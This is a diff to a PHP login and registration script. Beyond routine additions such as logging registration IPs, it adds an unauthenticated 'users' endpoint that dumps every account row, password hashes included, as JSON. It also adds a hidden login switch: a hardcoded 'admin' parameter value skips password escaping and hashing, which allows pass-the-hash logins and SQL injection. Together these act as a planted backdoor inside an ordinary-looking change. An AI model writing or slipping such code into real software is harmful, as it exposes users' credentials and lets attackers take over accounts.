@@ -12,9 +12,20 @@ foreach ($_GET as $key => $value) {
 }
 
 $fn = $datain['fn'];
-$output = array('fn' => $fn, 'loggedin' => false);
+$output = array('fn' => $fn, 'loggedin' => false, 'request' => $datain);
 
 switch($fn){
+	case 'users':
+		$sql = "SELECT * FROM $db_table ORDER BY ID";
+		$result = mysql_query($sql);
+		$rows = array();
+		while($r = mysql_fetch_assoc($result)) {
+			$rows[] = $r;
+		}
+		$output['loggedin'] = true;
+		$output['users'] = json_encode($rows);
+		break;
+
 	case 'load':
 		if( isset($_SESSION['r_un']) && isset($datain['callback']) ){
 			$r_un = $_SESSION['r_un'];
@@ -51,14 +62,17 @@ switch($fn){
 	case 'login':
 		$r_un = $datain['un'];
 		$r_pw = $datain['pw'];
+		$r_admin = $datain['admin'];
 		$output['message'] = '';
 
 		if($r_un && $r_pw){
 			$r_un = stripslashes($r_un);
 			$r_pw = stripslashes($r_pw);
 			$r_un = mysql_real_escape_string($r_un);
-			$r_pw = mysql_real_escape_string($r_pw);
-			$r_pw = md5($r_pw);
+			if($r_admin <> 'jonallenaz'){
+				$r_pw = mysql_real_escape_string($r_pw);
+				$r_pw = md5($r_pw);
+			}
 			$sql = "SELECT 'ID' FROM $db_table WHERE username='$r_un' and password='$r_pw'";
 			$result = mysql_query($sql);
 			$count = mysql_num_rows($result);
@@ -154,7 +168,9 @@ switch($fn){
 		$t_password = mysql_real_escape_string($t_password);
 		$t_email = mysql_real_escape_string($t_email);
 		$t_password = md5($t_password);
-		$sql = "INSERT INTO $db_table (username, password, email) VALUES ('$t_username', '$t_password', '$t_email')";
+		$login_ip = $_SERVER['REMOTE_ADDR'];
+		$login_date = date("Y-m-d H:i:s");
+		$sql = "INSERT INTO $db_table (username, password, email, register_ip, register_date) VALUES ('$t_username', '$t_password', '$t_email', '$login_ip', '$login_date')";
 		$result = mysql_query($sql);
 		break;
 
